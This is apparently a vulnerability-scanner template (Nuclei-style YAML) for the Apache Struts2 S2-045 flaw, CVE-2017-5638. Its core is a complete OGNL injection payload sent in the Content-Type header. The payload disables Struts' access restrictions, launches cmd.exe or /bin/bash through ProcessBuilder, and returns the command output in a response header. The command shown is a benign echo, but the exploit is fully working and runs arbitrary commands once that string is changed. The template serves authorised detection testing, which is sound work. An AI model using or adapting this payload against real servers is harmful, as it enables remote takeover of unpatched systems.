id: local-struts2-s2-045-cmd-rce

info:
  name: Local Struts2 S2-045 Command Execution (CVE-2017-5638)
  author: pentest-platform
  severity: critical
  tags: safe-poc,exploit,struts2,s2-045,cve,cve2017,rce

http:
  - method: POST
    path:
      - "{{BaseURL}}"
    headers:
      Content-Type: "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo pentest-platform-s2045-rce').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))).(#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-S2-045-RCE',#ros.trim()))}"
    body: ""
    matchers:
      - type: word
        part: header
        words:
          - "pentest-platform-s2045-rce"
    extractors:
      - type: regex
        name: rce_output
        part: header
        regex:
          - "X-S2-045-RCE: (.+)"
